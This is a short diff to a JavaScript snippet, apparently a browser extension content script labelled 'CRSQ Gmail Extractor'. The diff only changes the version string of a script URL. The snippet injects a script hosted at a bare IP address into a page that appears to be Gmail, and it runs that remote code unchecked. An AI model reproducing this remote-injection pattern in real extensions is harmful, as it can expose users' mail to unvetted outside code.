@@ -1,5 +1,5 @@
 var s = document.createElement('script');
-s.setAttribute('src', 'https://46.137.209.142/static/crsq/js/emailrecommender/crsqgmail.js?v=21.01212');
+s.setAttribute('src', 'https://46.137.209.142/static/crsq/js/emailrecommender/crsqgmail.js?v=21.0212');
 (document.head||document.documentElement).appendChild(s);
 console.log('CRSQ Gmail Extractor Running')
 s.onload = function() {
